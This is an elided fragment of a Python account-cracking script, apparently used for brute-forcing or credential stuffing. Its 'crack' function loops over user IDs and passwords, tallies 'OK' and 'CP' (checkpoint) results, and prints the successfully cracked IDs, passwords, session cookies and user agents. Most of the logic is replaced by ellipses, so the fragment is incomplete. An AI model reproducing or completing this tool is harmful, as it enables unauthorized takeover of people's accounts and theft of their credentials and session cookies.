...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ RAWA🔥  ] {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[32[{b}[RAWA-OK✅]\033[1;95m   {b}{idf} | \033[1;94m{b}{pw} |COOKIES🌼 \033[1;94m{b}{kuki}\n{b}{ua}{N}')
